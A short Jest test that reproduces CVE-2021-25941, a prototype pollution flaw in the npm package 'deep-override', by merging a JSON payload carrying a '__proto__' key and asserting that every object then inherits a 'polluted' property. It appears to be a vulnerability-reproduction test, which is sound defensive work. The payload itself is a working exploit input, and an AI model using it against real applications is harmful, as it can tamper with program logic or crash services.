//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
test("prototype pollution in deep-override", () => {
  expect({}.polluted).toBe(undefined);

  const deepOverride = require("deep-override");
  deepOverride({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));

  expect({}.polluted).toBe("yes");
});
